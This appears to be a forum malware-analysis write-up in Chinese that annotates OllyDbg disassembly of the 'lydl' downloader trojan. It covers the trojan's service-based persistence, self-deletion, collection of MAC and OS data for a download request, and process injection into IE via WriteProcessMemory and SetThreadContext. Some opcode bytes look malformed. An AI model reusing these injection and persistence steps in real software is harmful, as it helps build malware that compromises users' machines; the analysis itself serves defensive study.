@@ -1,0 +1,774 @@
+
+# 一个垃圾下载者的简要分析
+
+> 原文：[`www.pediy.com/kssd/pediy10/82269.html`](https://www.pediy.com/kssd/pediy10/82269.html)
+
+【文章标题】: 一个垃圾下载者的简要分析  
+【文章作者】: 小子贼野  
+【作者主页】: `Http://Hi.BaiDu.Com/XiAoZi5`  
+【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教！  
+
+----------------------------------------
+
+## 详细过程
+
+```
+  0040779C >/$  55                   push    ebp
+  0040779D  |.  8BEC                 mov     ebp, esp
+  0040779F  |.  B9 0B000000          mov     ecx, 0B
+  004077A4  |>  6A 00                /push    0
+  004077A6  |.  6A 00                |push    0
+  004077A8  |.  49                   |dec     ecx
+  004077A9  |.^ 75 F9                \jnz     short 004077A4
+  004077AB  |.  53                   push    ebx
+  004077AC  |.  B8 2C774000          mov     eax, 0040772C                    ;  \n
+  004077B1  |.  E8 6ED1FFFF         call    00404924
+  004077B6  |.  33C0                 xor     eax, eax
+  004077B8  |.  55                   push    ebp
+  004077B9  |.  68 D57A4000          push    00407AD5
+  004077BE  |.  64:FF30             push    dword ptr fs:[eax]
+  004077C1  |.  64:8920             mov     dword ptr fs:[eax], esp
+  004077C4  |.  8D55 EC             lea     edx, dword ptr [ebp-14]
+  004077C7  |.  B8 E47A4000          mov     eax, 00407AE4                    ;  @xjk
+  004077CC  |.  E8 EBE8FFFF         call    004060BC
+  004077D1  |.  8B45 EC             mov     eax, dword ptr [ebp-14]
+  004077D4  |.  BA F47A4000          mov     edx, 00407AF4                    ;  jskb$144>7?
+  004077D9  |.  E8 6AC5FFFF         call    00403D48
+  004077DE  |.  0F84 3B010000       je      0040791F
+  004077E4  |.  68 007B4000          push    00407B00                          ;  jskb$144>7?
+  004077E9  |.  6A 01                push    1
+  004077EB  |.  B9 E47A4000          mov     ecx, 00407AE4                    ;  @xjk
+  004077F0  |.  BA 0C7B4000          mov     edx, 00407B0C                    ;  software\lydl  在 `HKEY_LOCAL_MACHINE\software\lydl` 下写一些 XX
+  004077F5  |.  B8 02000080          mov     eax, 80000002
+  004077FA  |.  E8 59E9FFFF         call    00406158
+  004077FF  |.  6A 01                push    1
+  00407801  |.  8D55 E4             lea     edx, dword ptr [ebp-1C]
+  00407804  |.  B8 01000000          mov     eax, 1
+  00407809  |.  E8 76DEFFFF         call    00405684
+  0040780E  |.  FF75 E4             push    dword ptr [ebp-1C]
+  00407811  |.  68 247B4000          push    00407B24                          ;  lydl.exe
+  00407816  |.  68 387B4000          push    00407B38                          ;  .bak
+  0040781B  |.  8D45 E8             lea     eax, dword ptr [ebp-18]
+  0040781E  |.  BA 03000000          mov     edx, 3
+  00407823  |.  E8 94C4FFFF         call    00403CBC
+  00407828  |.  8B45 E8             mov     eax, dword ptr [ebp-18]
+  0040782B  |.  E8 CCC5FFFF         call    00403DFC
+  00407830  |.  50                   push    eax
+  00407831  |.  8D55 E0             lea     edx, dword ptr [ebp-20]
+  00407834  |.  B8 01000000          mov     eax, 1
+  00407839  |.  E8 46DEFFFF         call    00405684
+  0040783E  |.  8D45 E0             lea     eax, dword ptr [ebp-20]
+  00407841  |.  BA 247B4000          mov     edx, 00407B24                    ;  lydl.exe
+  00407846  |.  E8 B9C3FFFF         call    00403C04
+  0040784B  |.  8B45 E0             mov     eax, dword ptr [ebp-20]
+  0040784E  |.  E8 A9C5FFFF         call    00403DFC
+  00407853  |.  50                   push    eax                                 ; |ExistingName
+  00407854  |.  E8 37D2FFFF         call    <jmp.&kernel32.MoveFileExA>           ; \MoveFileExA
+  00407859  |.  8D55 D4             lea     edx, dword ptr [ebp-2C]
+  0040785C  |.  B8 01000000          mov     eax, 1
+  00407861  |.  E8 1EDEFFFF         call    00405684
+  00407866  |.  FF75 D4             push    dword ptr [ebp-2C]
+  00407869  |.  68 247B4000          push    00407B24                          ;  lydl.exe
+  0040786E  |.  68 387B4000          push    00407B38                          ;  .bak
+  00407873  |.  8D45 D8             lea     eax, dword ptr [ebp-28]
+  00407876  |.  BA 03000000          mov     edx, 3
+  0040787B  |.  E8 3CC4FFFF         call    00403CBC
+  00407880  |.  8B45 D8             mov     eax, dword ptr [ebp-28]
+  00407883  |.  E8 74C5FFFF         call    00403DFC
+  00407888  |.  8BD0                 mov     edx, eax
+  0040788A  |.  8D45 DC             lea     eax, dword ptr [ebp-24]
+  0040788D  |.  E8 16C3FFFF         call    00403BA8
+  00407892  |.  8B45 DC             mov     eax, dword ptr [ebp-24]
+  00407895  |.  E8 DAD8FFFF         call    00405174
+  0040789A  |.  6A FF                push    -1
+  0040789C  |.  8D55 D0             lea     edx, dword ptr [ebp-30]
+  0040789F  |.  B8 01000000          mov     eax, 1
+  004078A4  |.  E8 DBDDFFFF         call    00405684
+  004078A9  |.  8D45 D0             lea     eax, dword ptr [ebp-30]
+  004078AC  |.  BA 247B4000          mov     edx, 00407B24                    ;  lydl.exe
+  004078B1  |.  E8 4EC3FFFF         call    00403C04
+  004078B6  |.  8B45 D0             mov     eax, dword ptr [ebp-30]
+  004078B9  |.  E8 3EC5FFFF         call    00403DFC
+  004078BE  |.  50                   push    eax
+  004078BF  |.  8D55 CC             lea     edx, dword ptr [ebp-34]
+  004078C2  |.  33C0                 xor     eax, eax
+  004078C4  |.  E8 93AEFFFF         call    0040275C
+  004078C9  |.  8B45 CC             mov     eax, dword ptr [ebp-34]
+  004078CC  |.  E8 2BC5FFFF         call    00403DFC
+  004078D1  |.  50                   push    eax                                 ; |ExistingFileName
+  004078D2  |.  E8 31D1FFFF         call    <jmp.&kernel32.CopyFileA>             ; \CopyFileA
+  004078D7  |.  8D55 C4             lea     edx, dword ptr [ebp-3C]
+  004078DA  |.  B8 01000000          mov     eax, 1
+  004078DF  |.  E8 A0DDFFFF         call    00405684
+  004078E4  |.  8D45 C4             lea     eax, dword ptr [ebp-3C]
+  004078E7  |.  BA 247B4000          mov     edx, 00407B24                    ;  lydl.exe
+  004078EC  |.  E8 13C3FFFF         call    00403C04
+  004078F1  |.  8B45 C4             mov     eax, dword ptr [ebp-3C]
+  004078F4  |.  E8 03C5FFFF         call    00403DFC
+  004078F9  |.  8BD0                 mov     edx, eax
+  004078FB  |.  8D45 C8             lea     eax, dword ptr [ebp-38]
+  004078FE  |.  E8 A5C2FFFF         call    00403BA8
+  00407903  |.  8B4D C8             mov     ecx, dword ptr [ebp-38]
+  00407906  |.  BA 407B4000          mov     edx, 00407B40                    ;  free-090101
+  0040790B  |.  B8 4C7B4000          mov     eax, 00407B4C                    ;  lydl
+  00407910  |.  E8 C7DEFFFF         call    004057DC                           ;  这个 CALL 是创建系统服务，以实现开机启动
+  00407915  |.  E8 92DFFFFF         call    004058AC                           ;  这个 CALL 是调用一个批处理文件来删除木马自身的
+  0040791A  |.  E9 9B010000         jmp     00407ABA
+  0040791F  |>  8D55 C0             lea     edx, dword ptr [ebp-40]
+  00407922  |.  B8 5C7B4000          mov     eax, 00407B5C
+  省略 N 行代码
+  00407A2E  |.  FF35 50984000       push    dword ptr [409850]
+  00407A34  |.  68 407C4000          push    00407C40                          ;  ?mac=
+  00407A39  |.  8D45 B0             lea     eax, dword ptr [ebp-50]
+  00407A3C  |.  E8 6FE1FFFF         call    00405BB0                           ;  通过 `LoadLibrary` 和 `GetProcAddress` 来获得 `UuidCreateSequential` 然后获取网卡地址的
+  00407A41  |.  FF75 B0             push    dword ptr [ebp-50]
+  00407A44  |.  68 507C4000          push    00407C50                          ;  &ver=
+  00407A49  |.  8D55 AC             lea     edx, dword ptr [ebp-54]
+  00407A4C  |.  B8 F47A4000          mov     eax, 00407AF4                    ;  jskb$144>7?
+  00407A51  |.  E8 7AE5FFFF         call    00405FD0
+  00407A56  |.  FF75 AC             push    dword ptr [ebp-54]
+```
+
+
+
+#### 00407A59
+
+```
+  00407A59  |.  68 607C4000     push    00407C60                    ;  &os=  
+  00407A5E  |.  8D45 A8        lea     eax, dword ptr [ebp-58]     
+  00407A61  |.  E8 1EE3FFFF    call    00405D84                    ;  通过 GetVersion 来获得系统  
+  00407A66  |.  FF75 A8        push    dword ptr [ebp-58]          
+  00407A69  |.  8D45 B4        lea     eax, dword ptr [ebp-4C]     
+  00407A6C  |.  BA 07000000    mov     edx, 7                       
+  00407A71  |.  E8 46C2FFFF    call    00403CBC                    
+  00407A76  |.  8B45 B4        mov     eax, dword ptr [ebp-4C]     
+  00407A79  |.  E8 7EC3FFFF    call    00403DFC                    
+  00407A7E  |.  8D55 B8        lea     edx, dword ptr [ebp-48]      
+  00407A81  |.  E8 22E0FFFF    call    00405AA8                    ;  通过一系列函数来打开连接然后下载一堆文件的  
+  00407A86  |.  33C0           xor     eax, eax                      
+  00407A88  |.  A3 48984000    mov     dword ptr [409848], eax     
+  00407A8D  |.  33C0           xor     eax, eax                      
+  00407A8F  |.  A3 4C984000    mov     dword ptr [40984C], eax     
+  00407A94  |.  E8 13FBFFFF    call    004075AC                    
+  00407A99  |.  833D 48984000 01  cmp     dword ptr [409848], 1     
+  00407AA0  |.  1BC0           sbb     eax, eax                      
+  00407AA2  |.  40             inc     eax                           
+  00407AA3  |.  84C0           test    al, al                        
+  00407AA5  |.  75 13          jnz     short 00407ABA               
+  00407AA7  |.  833D 4C984000 01  cmp     dword ptr [40984C], 1     
+  00407AAE  |.  1BC0           sbb     eax, eax                      
+  00407AB0  |.  40             inc     eax                           
+  00407AB1  |.  84C0           test    al, al                        
+  00407AB3  |.  75 05          jnz     short 00407ABA               
+  00407AB5  |.  E8 6AFAFFFF    call    00407524                    ;  在获取了 windows 目录和 temp 目录后创建一个文件夹，名字为:lydl  
+  00407ABA  |>  33C0           xor     eax, eax                      
+  00407ABC  |.  5A             pop     edx                           
+  00407ABD  |.  59             pop     ecx                           
+  00407ABE  |.  59             pop     ecx                           
+  00407ABF  |.  64:8910        mov     dword ptr fs:[eax], edx     
+  00407AC2  |.  68 DC7A4000    push    00407ADC                    
+  00407AC7  |>  8D45 A8        lea     eax, dword ptr [ebp-58]     
+  00407ACA  |.  BA 12000000    mov     edx, 12                       
+  00407ACF  |.  E8 C8BFFFFF    call    00403A9C                    
+  00407AD4  \.  C3             retn                                  
+  ******
+```
+
+#### 跟进 `00407A61` 的 `call 00405D84`
+
+```
+  00405DA0  |.  55             push    ebp                         
+  00405DA1  |.  68 F45E4000    push    00405EF4                    
+  00405DA6  |.  64:FF30        push    dword ptr fs:[eax]          
+  00405DA9  |.  64:8920        mov     dword ptr fs:[eax], esp     
+  00405DAC  |.  8BC3           mov     eax, ebx                      
+  00405DAE  |.  BA 085F4000    mov     edx, 00405F08                ;  未知  
+  00405DB3  |.  E8 14DDFFFF    call    00403ACC                    
+  00405DB8  |.  C785 6CFFFFFF> mov     dword ptr [ebp-94], 94      
+  00405DC2  |.  8D85 6CFFFFFF  lea     eax, dword ptr [ebp-94]     
+  00405DC8  |.  50             push    eax                          ;  /pVersionInformation  
+  00405DC9  |.  E8 A2ECFFFF    call    <jmp.&kernel32.GetVersionExA> ;  \GetVersionExA  
+  00405DCE  |.  8B85 7CFFFFFF  mov     eax, dword ptr [ebp-84]     
+  00405DD4  |.  48             dec     eax                          ;  Switch (cases 1..2)  
+  00405DD5  |.  74 78          je      short 00405E4F               
+  00405DD7  |.  48             dec     eax                           
+  00405DD8  |.  0F85 B0000000  jnz     00405E8E                    
+  00405DDE  |.  8B85 70FFFFFF  mov     eax, dword ptr [ebp-90]      ;  Case 2 of switch 00405DD4  
+  00405DE4  |.  83E8 04        sub     eax, 4                       ;  Switch (cases 4..6)  
+  00405DE7  |.  74 0B          je      short 00405DF4               
+  00405DE9  |.  48             dec     eax                           
+  00405DEA  |.  74 19          je      short 00405E05               
+  00405DEC  |.  48             dec     eax                           
+  00405DED  |.  74 52          je      short 00405E41               
+  00405DEF  |.  E9 9A000000    jmp     00405E8E                    
+  00405DF4  |>  8BC3           mov     eax, ebx                     ;  Case 4 of switch 00405DE4  
+  00405DF6  |.  BA 185F4000    mov     edx, 00405F18                ;  windows nt 4.0  
+  00405DFB  |.  E8 CCDCFFFF    call    00403ACC                    
+  00405E00  |.  E9 89000000    jmp     00405E8E                    
+  00405E05  |>  8B85 74FFFFFF  mov     eax, dword ptr [ebp-8C]      ;  Case 5 of switch 00405DE4  
+  00405E0B  |.  83E8 01        sub     eax, 1                       ;  Switch (cases 0..2)  
+  00405E0E  |.  72 07          jb      short 00405E17               
+  00405E10  |.  74 13          je      short 00405E25               
+  00405E12  |.  48             dec     eax                           
+  00405E13  |.  74 1E          je      short 00405E33               
+  00405E15  |.  EB 77          jmp     short 00405E8E               
+  00405E17  |>  8BC3           mov     eax, ebx                     ;  Case 0 of switch 00405E0B  
+  00405E19  |.  BA 305F4000    mov     edx, 00405F30                ;  windows 2000  
+  00405E1E  |.  E8 A9DCFFFF    call    00403ACC                    
+  00405E23  |.  EB 69          jmp     short 00405E8E               
+  00405E25  |>  8BC3           mov     eax, ebx                     ;  Case 1 of switch 00405E0B  
+  00405E27  |.  BA 485F4000    mov     edx, 00405F48                ;  windows xp  
+  00405E2C  |.  E8 9BDCFFFF    call    00403ACC                    
+  00405E31  |.  EB 5B          jmp     short 00405E8E               
+  00405E33  |>  8BC3           mov     eax, ebx                     ;  Case 2 of switch 00405E0B  
+  00405E35  |.  BA 5C5F4000    mov     edx, 00405F5C                ;  windows server 2003  
+  00405E3A  |.  E8 8DDCFFFF    call    00403ACC                    
+  00405E3F  |.  EB 4D          jmp     short 00405E8E               
+  00405E41  |>  8BC3           mov     eax, ebx                     ;  Case 6 of switch 00405DE4  
+  00405E43  |.  BA 785F4000    mov     edx, 00405F78                ;  windows vista  
+  00405E48  |.  E8 7FDCFFFF    call    00403ACC                    
+  00405E4D  |.  EB 3F          jmp     short 00405E8E               
+  00405E4F  |>  8B85 74FFFFFF  mov     eax, dword ptr [ebp-8C]      ;  Case 1 of switch 00405DD4  
+  00405E55  |.  83E8 01        sub     eax, 1                       ;  Switch (cases 0..5A)  
+  00405E58  |.  72 0C          jb      short 00405E66               
+  00405E5A  |.  83E8 09        sub     eax, 9                        
+  00405E5D  |.  74 15          je      short 00405E74               
+  00405E5F  |.  83E8 50        sub     eax, 50                       
+  00405E62  |.  74 1E          je      short 00405E82               
+  00405E64  |.  EB 28          jmp     short 00405E8E               
+  00405E66  |>  8BC3           mov     eax, ebx                     ;  Case 0 of switch 00405E55  
+  00405E68  |.  BA 905F4000    mov     edx, 00405F90                ;  windows 95  
+  00405E6D  |.  E8 5ADCFFFF    call    00403ACC                    
+  00405E72  |.  EB 1A          jmp     short 00405E8E               
+  00405E74  |>  8BC3           mov     eax, ebx                     ;  Case A (Line Feed) of switch 00405E55  
+  00405E76  |.  BA A45F4000    mov     edx, 00405FA4                ;  windows 98  
+  00405E7B  |.  E8 4CDCFFFF    call    00403ACC                    
+  00405E80  |.  EB 0C          jmp     short 00405E8E               
+  00405E82  |>  8BC3           mov     eax, ebx                     ;  Case 5A ('Z') of switch 00405E55  
+  00405E84  |.  BA B85F4000    mov     edx, 00405FB8                ;  windows me  
+  00405E89  |.  E8 3EDCFFFF    call    00403ACC                    
+  00405E8E  |>  8D85 68FFFFFF  lea     eax, dword ptr [ebp-98]      ;  Default case of switch 00405E55  
+  00405E94  |.  8D55 80        lea     edx, dword ptr [ebp-80]     
+  00405E97  |.  B9 80000000    mov     ecx, 80                       
+  00405E9C  |.  E8 43DDFFFF    call    00403BE4                    
+  00405EA1  |.  83BD 68FFFFFF> cmp     dword ptr [ebp-98], 0       
+  00405EA8  |.  74 2C          je      short 00405ED6               
+  00405EAA  |.  FF33           push    dword ptr [ebx]             
+  00405EAC  |.  68 CC5F4000    push    00405FCC                    
+```
+
+
+
+00405EB1 |. 8D85 64FFFFFF lea eax, dword ptr [ebp-9C]  
+00405EB7 |. 8D55 80 lea edx, dword ptr [ebp-80]  
+00405EBA |. B9 80000000 mov ecx, 80  
+00405EBF |. E8 20DDFFFF call 00403BE4  
+00405EC4 |. FFB5 64FFFFFF push dword ptr [ebp-9C]  
+00405ECA |. 8BC3 mov eax, ebx  
+00405ECC |. BA 03000000 mov edx, 3  
+00405ED1 |. E8 E6DDFFFF call 00403CBC  
+00405ED6 |> 33C0 xor eax, eax  
+00405ED8 |. 5A pop edx  
+00405ED9 |. 59 pop ecx  
+00405EDA |. 59 pop ecx  
+00405EDB |. 64:8910 mov dword ptr fs:[eax], edx  
+00405EDE |. 68 FB5E4000 push 00405EFB  
+00405EE3 |> 8D85 64FFFFFF lea eax, dword ptr [ebp-9C]  
+00405EE9 |. BA 02000000 mov edx, 2  
+00405EEE |. E8 A9DBFFFF call 00403A9C  
+00405EF3 \\. C3 retn ; 以上代码是通过 `GetVersionExA` 来检测是什么版本的操作系统
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+004068FC /$ 55 push ebp  
+004068FD |. 8BEC mov ebp, esp  
+004068FF |. 81C4 10FFFFFF add esp, -0F0  
+省略 N 行代码  
+0040694F |. E8 F0FCFFFF call 00406644 ; 注入进程，所注入的进程是根据自己的配置注入的，我这里是注入 IE  
+00406954 |. 8D45 E0 lea eax, dword ptr [ebp-20]  
+00406957 |. 50 push eax  
+00406958 |. 8B45 08 mov eax, dword ptr [ebp+8]  
+0040695B |. 50 push eax  
+0040695C |. 8D45 F0 lea eax, dword ptr [ebp-10]  
+0040695F |. 50 push eax  
+00406960 |. 8D45 EC lea eax, dword ptr [ebp-14]  
+00406963 |. 50 push eax  
+00406964 |. 8D4D F8 lea ecx, dword ptr [ebp-8]  
+00406967 |. 8D95 14FFFFFF lea edx, dword ptr [ebp-EC]  
+0040696D |. 8B45 F4 mov eax, dword ptr [ebp-C]  
+00406970 |. E8 73FEFFFF call 004067E8  
+00406975 |. 84C0 test al, al  
+00406977 |. 0F84 7E010000 je 00406AFB  
+0040697D |. 33C0 xor eax, eax  
+0040697F |. 8945 E4 mov dword ptr [ebp-1C], eax  
+00406982 |. 8B43 34 mov eax, dword ptr [ebx+34]  
+00406985 |. 3B45 F0 cmp eax, dword ptr [ebp-10]  
+00406988 |. 75 27 jnz short 004069B1  
+0040698A |. 8B45 EC mov eax, dword ptr [ebp-14]  
+0040698D |. 3B45 0C cmp eax, dword ptr [ebp+C]  
+00406990 |. 72 1F jb short 004069B1  
+00406992 |. 8B45 F0 mov eax, dword ptr [ebp-10]  
+00406995 |. 8945 E4 mov dword ptr [ebp-1C], eax  
+00406998 |. 8D45 E8 lea eax, dword ptr [ebp-18]  
+0040699B |. 50 push eax ; /pOldProtect  
+0040699C |. 6A 40 push 40 ; |NewProtect = `PAGE_EXECUTE_READWRITE`  
+0040699E |. 8B45 EC mov eax, dword ptr [ebp-14] ; |  
+004069A1 |. 50 push eax ; |Size  
+004069A2 |. 8B45 E4 mov eax, dword ptr [ebp-1C] ; |  
+004069A5 |. 50 push eax ; |Address  
+004069A6 |. 8B45 F8 mov eax, dword ptr [ebp-8] ; |  
+004069A9 |. 50 push eax ; |hProcess  
+004069AA |. E8 29E1FFFF call <jmp.&kernel32.`VirtualProtectEx`> ; \\`VirtualProtectEx`  
+004069AF |. EB 72 jmp short 00406A23  
+004069B1 |> E8 82FCFFFF call 00406638  
+004069B6 |. 84C0 test al, al  
+004069B8 |. 74 69 je short 00406A23  
+004069BA |. 8B55 F0 mov edx, dword ptr [ebp-10]  
+004069BD |. 8B45 F8 mov eax, dword ptr [ebp-8]  
+004069C0 |. E8 B7FDFFFF call 0040677C  
+004069C5 |. 84C0 test al, al  
+004069C7 |. 74 1C je short 004069E5  
+004069C9 |. 6A 40 push 40  
+004069CB |. 68 00300000 push 3000  
+004069D0 |. 8B45 0C mov eax, dword ptr [ebp+C]  
+004069D3 |. 50 push eax  
+004069D4 |. 8B43 34 mov eax, dword ptr [ebx+34]  
+004069D7 |. 50 push eax  
+004069D8 |. 8B45 F8 mov eax, dword ptr [ebp-8]  
+004069DB |. 50 push eax  
+004069DC |. FF15 CC804000 call dword ptr [4080CC]  
+004069E2 |. 8945 E4 mov dword ptr [ebp-1C], eax  
+004069E5 |> 837D E4 00 cmp dword ptr [ebp-1C], 0  
+004069E9 |. 75 38 jnz short 00406A23  
+004069EB |. 8BC3 mov eax, ebx  
+004069ED |. E8 0AFDFFFF call 004066FC  
+004069F2 |. 84C0 test al, al  
+004069F4 |. 74 2D je short 00406A23  
+004069F6 |. 6A 40 push 40  
+004069F8 |. 68 00300000 push 3000  
+004069FD |. 8B45 0C mov eax, dword ptr [ebp+C]  
+00406A00 |. 50 push eax  
+00406A01 |. 6A 00 push 0  
+00406A03 |. 8B45 F8 mov eax, dword ptr [ebp-8]  
+00406A06 |. 50 push eax  
+00406A07 |. FF15 CC804000 call dword ptr [4080CC]  
+00406A0D |. 8945 E4 mov dword ptr [ebp-1C], eax  
+00406A10 |. 837D E4 00 cmp dword ptr [ebp-1C], 0  
+00406A14 |. 74 0D je short 00406A23  
+00406A16 |. 8B4D E4 mov ecx, dword ptr [ebp-1C]  
+00406A19 |. 8B55 10 mov edx, dword ptr [ebp+10]  
+00406A1C |. 8BC3 mov eax, ebx  
+00406A1E |. E8 F1FCFFFF call 00406714  
+00406A23 |> 837D E4 00 cmp dword ptr [ebp-1C], 0  
+00406A27 |. 0F84 AA000000 je 00406AD7  
+00406A2D |. 8D45 E8 lea eax, dword ptr [ebp-18]  
+00406A30 |. 50 push eax ; /pBytesWritten  
+00406A31 |. 6A 04 push 4 ; |BytesToWrite = 4  
+00406A33 |. 8D45 E4 lea eax, dword ptr [ebp-1C] ; |  
+00406A36 |. 50 push eax ; |Buffer  
+00406A37 |. 8B45 B8 mov eax, dword ptr [ebp-48] ; |  
+00406A3A |. 83C0 08 add eax, 8 ; |  
+00406A3D |. 50 push eax ; |Address  
+00406A3E |. 8B45 F8 mov eax, dword ptr [ebp-8] ; |  
+00406A41 |. 50 push eax ; |hProcess  
+00406A42 |. E8 B1E0FFFF call <jmp.&kernel32.`WriteProcessMemory`> ; \\`WriteProcessMemory`  
+00406A47 |. 8B45 E4 mov eax, dword ptr [ebp-1C]  
+00406A4A |. 8943 34 mov dword ptr [ebx+34], eax  
+00406A4D |. 8D45 E8 lea eax, dword ptr [ebp-18]  
+00406A50 |. 50 push eax ; /pBytesWritten  
+00406A51 |. 8B45 0C mov eax, dword ptr [ebp+C] ; |  
+00406A54 |. 50 push eax ; |BytesToWrite  
+00406A55 |. 8B45 10 mov eax, dword ptr [ebp+10] ; |
+
+
+
+```
+  00406A58  |.  50               push    eax                            ; |Buffer  
+  00406A59  |.  8B45 E4          mov     eax, dword ptr [ebp-1C]       ; |  
+  00406A5C  |.  50               push    eax                            ; |Address  
+  00406A5D  |.  8B45 F8          mov     eax, dword ptr [ebp-8]        ; |  
+  00406A60  |.  50               push    eax                            ; |hProcess  
+  00406A61  |.  E8 92E0FFFFFF    call    <jmp.&kernel32.WriteProcessMemory>  ; \WriteProcessMemory  
+  00406A66  |.  85C0             test    eax, eax  
+  00406A68  |.  74 47            je      short 00406AB1  
+  00406A6A  |.  C785 14FFFFFF 07> mov     dword ptr [ebp-EC], 10007  
+  00406A74  |.  8B45 E4          mov     eax, dword ptr [ebp-1C]  
+  00406A77  |.  3B45 F0          cmp     eax, dword ptr [ebp-10]  
+  00406A7A  |.  75 0B            jnz     short 00406A87  
+  00406A7C  |.  8B43 34          mov     eax, dword ptr [ebx+34]  
+  00406A7F  |.  0343 28          add     eax, dword ptr [ebx+28]  
+  00406A82  |.  8945 C4          mov     dword ptr [ebp-3C], eax  
+  00406A85  |.  EB 06            jmp     short 00406A8D  
+  00406A87  |>  0343 28          add     eax, dword ptr [ebx+28]  
+  00406A8A  |.  8945 C4          mov     dword ptr [ebp-3C], eax  
+  00406A8D  |>  8D85 14FFFFFF   lea     eax, dword ptr [ebp-EC]  
+  00406A93  |.  50               push    eax                            ; /pContext  
+  00406A94  |.  8B45 E0          mov     eax, dword ptr [ebp-20]       ; |  
+  00406A97  |.  50               push    eax                            ; |hThread  
+  00406A98  |.  E8 1BE0FFFFFF   call    <jmp.&kernel32.SetThreadContext>    ; \SetThreadContext  
+  00406A9D  |.  8B45 E0          mov     eax, dword ptr [ebp-20]  
+  00406AA0  |.  50               push    eax                            ; /hThread  
+  00406AA1  |.  E8 02E0FFFFFF   call    <jmp.&kernel32.ResumeThread>        ; \ResumeThread  
+  00406AA6  |.  8B45 E0          mov     eax, dword ptr [ebp-20]  
+  00406AA9  |.  50               push    eax                            ; /hObject  
+  00406AAA  |.  E8 51DFFFFF     call    <jmp.&kernel32.CloseHandle>          ; \CloseHandle  
+  00406AAF  |.  EB 4A            jmp     short 00406AFB  
+  00406AB1  |>  6A 00            push    0                              ; /ExitCode = 0  
+  00406AB3  |.  8B45 F8          mov     eax, dword ptr [ebp-8]        ; |  
+  00406AB6  |.  50               push    eax                            ; |hProcess  
+  00406AB7  |.  E8 04E0FFFFFF   call    <jmp.&kernel32.TerminateProcess>    ; \TerminateProcess  
+  00406ABC  |.  8B45 E0          mov     eax, dword ptr [ebp-20]  
+  00406ABF  |.  50               push    eax                            ; /hObject  
+  00406AC0  |.  E8 3BDFFFFF     call    <jmp.&kernel32.CloseHandle>          ; \CloseHandle  
+  00406AC5  |.  8B45 F8          mov     eax, dword ptr [ebp-8]  
+  00406AC8  |.  50               push    eax                            ; /hObject  
+  00406AC9  |.  E8 32DFFFFF     call    <jmp.&kernel32.CloseHandle>          ; \CloseHandle  
+  00406ACE  |.  C745 F8 FFFFFFFF mov    dword ptr [ebp-8], -1  
+  00406AD5  |.  EB 24            jmp     short 00406AFB  
+  00406AD7  |>  6A 00            push    0                              ; /ExitCode = 0  
+  00406AD9  |.  8B45 F8          mov     eax, dword ptr [ebp-8]        ; |  
+  00406ADC  |.  50               push    eax                            ; |hProcess  
+  00406ADD  |.  E8 DEDFFFFF     call    <jmp.&kernel32.TerminateProcess>    ; \TerminateProcess  
+  00406AE2  |.  8B45 E0          mov     eax, dword ptr [ebp-20]  
+  00406AE5  |.  50               push    eax                            ; /hObject  
+  00406AE6  |.  E8 15DFFFFF     call    <jmp.&kernel32.CloseHandle>          ; \CloseHandle  
+  00406AEB  |.  8B45 F8          mov     eax, dword ptr [ebp-8]  
+  00406AEE  |.  50               push    eax                            ; /hObject  
+  00406AEF  |.  E8 0CDFFFFF     call    <jmp.&kernel32.CloseHandle>          ; \CloseHandle  
+  00406AF4  |.  C745 F8 FFFFFFFF mov    dword ptr [ebp-8], -1  
+  00406AFB  |>  33C0             xor     eax, eax  
+  00406AFD  |.  5A               pop     edx  
+  00406AFE  |.  59               pop     ecx  
+  00406AFF  |.  59               pop     ecx  
+  00406B00  |.  64:8910          mov     dword ptr fs:[eax], edx  
+  00406B03  |.  68 2B6B4000      push    00406B2B  
+  00406B08  |>  8D85 10FFFFFF   lea     eax, dword ptr [ebp-F0]  
+  00406B0E  |.  E8 65CFFFFF     call    00403A78  
+  00406B13  |.  8D45 F4          lea     eax, dword ptr [ebp-C]  
+  00406B16  |.  E8 5DCFFFFF     call    00403A78  
+  00406B1B  |.  8D45 FC          lea     eax, dword ptr [ebp-4]  
+  00406B1E  |.  E8 55CFFFFF     call    00403A78  
+  00406B23  \\.  C3             retn  
+```
+
+通过 `VirtualProtectEx` 来申请一段内存空间，然后通过 `WriteProcessMemory` 写进去该内存空间，然后通过 `SetThreadContext` 来指定线程，然后再用 `ResumeThread` 启动线程，我以前也这么写过一个东西，但是某大牛告诉我说这方法不好
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+```
+  00407221  |.  BA CC744000     mov     edx, 004074CC                 ; \utf8.nls
+```
+
+中间省略 N 行代码
+
+```
+  00407379  |.  E8 06E3FFFFFF   |call    00405684  
+  0040737E  |.  FFB5 FCFDFFFF   |push    dword ptr [ebp-204]  
+  00407384  |.  68 EC744000     |push    004074EC                    ; \lydl\  
+  00407389  |.  68 FC744000     |push    004074FC                    ; lydl  
+  0040738E  |.  8D95 F8FDFFFF   |lea     edx, dword ptr [ebp-208]  
+  00407394  |.  8BC3             |mov     eax, ebx  
+  00407396  |.  E8 A1FDFFFF     |call    0040713C  
+  0040739B  |.  FFB5 F8FDFFFF   |push    dword ptr [ebp-208]  
+  004073A1  |.  68 0C754000     |push    0040750C                    ; .exe  
+  004073A6  |.  8D85 00FEFFFF   |lea     eax, dword ptr [ebp-200]  
+  004073AC  |.  BA 05000000     |mov     edx, 5  
+  004073B1  |.  E8 06C9FFFF     |call    00403CBC  
+  004073B6  |.  8B85 00FEFFFF   |mov     eax, dword ptr [ebp-200]  
+  004073BC  |.  E8 F7FCFFFF     |call    004070B8                    ; 这个 CALL 是通过 CreateFile 在系统目录下创建一个文件的  
+  004073C1  |.  6A 00            |push    0  
+  004073C3  |.  8D95 F0FDFFFF   |lea     edx, dword ptr [ebp-210]  
+  004073C9  |.  B8 02000000     |mov     eax, 2  
+  004073CE  |.  E8 B1E2FFFFFF   |call    00405684                    ; 这个是获取系统路径和 TEMP 文件的路径的，F7 跟进一下看看  
